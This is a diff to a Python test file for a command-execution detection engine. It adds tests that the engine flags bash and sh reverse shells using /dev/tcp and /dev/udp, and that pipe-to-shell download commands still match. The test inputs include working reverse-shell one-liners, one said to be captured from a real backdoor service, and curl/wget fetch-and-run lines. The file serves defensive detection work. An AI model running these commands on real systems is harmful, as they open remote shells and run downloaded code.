@@ -72,3 +72,51 @@ def test_command_stored_in_args_via_normalized(engine):
     # case-insensitive and whitespace-robust.
     c = _t1059(engine, _shell_event("CURL http://x/s.sh  |  BASH"))
     assert c is not None and c.matched is True
+
+
+# ---------------------------------------------------------------------------
+# /dev/tcp and /dev/udp bash/zsh built-in reverse shells
+# ---------------------------------------------------------------------------
+
+def test_matches_dev_tcp_reverse_shell_real_attack_command(engine):
+    """Exact command captured live on a real host: threatactor-backdoor.service's
+    ExecStart running a bash-native /dev/tcp reverse shell — previously
+    invisible because no external tool binary (curl/wget/nc/...) is invoked."""
+    c = _t1059(engine, _shell_event(
+        '/bin/bash -c bash -i >& /dev/tcp/192.168.88.157/4444 0>&1'
+    ))
+    assert c is not None, "Expected a candidate for the /dev/tcp reverse shell"
+    assert c.matched is True
+    assert c.suppressed is False
+
+
+def test_dev_tcp_adds_high_confidence_reason_and_score(engine):
+    baseline = _t1059(engine, _shell_event("curl http://x/s.sh | bash"))
+    devtcp = _t1059(engine, _shell_event(
+        'bash -c bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
+    ))
+    assert devtcp.risk_score > baseline.risk_score
+    assert any("high-confidence reverse-shell indicator" in r for r in devtcp.adjustment_reasons)
+
+
+def test_matches_dev_udp_reverse_shell():
+    c = _t1059(YAMLDetectionEngine(), _shell_event(
+        'sh -c sh -i >& /dev/udp/10.0.0.1/53 0>&1', name="sh"
+    ))
+    assert c is not None and c.matched is True
+
+
+def test_no_match_dev_tcp_without_shell_spawn_indicator(engine):
+    """A bare mention of /dev/tcp with no pipe-to-shell / -c wrapper must not
+    match — the technique still requires the same shell-spawn condition as
+    curl/wget, e.g. a benign inline redirect a script might use for a port
+    reachability check without invoking a nested shell."""
+    c = _t1059(engine, _shell_event('exec 3<>/dev/tcp/10.0.0.1/80'))
+    assert c is None or c.matched is False
+
+
+def test_curl_pipe_bash_still_matches_after_dev_tcp_addition():
+    """Regression guard: adding /dev/tcp/udp to the network-tool list must not
+    disturb the original curl/wget/nc matching path."""
+    c = _t1059(YAMLDetectionEngine(), _shell_event("wget http://x/p | sh", name="sh"))
+    assert c is not None and c.matched is True
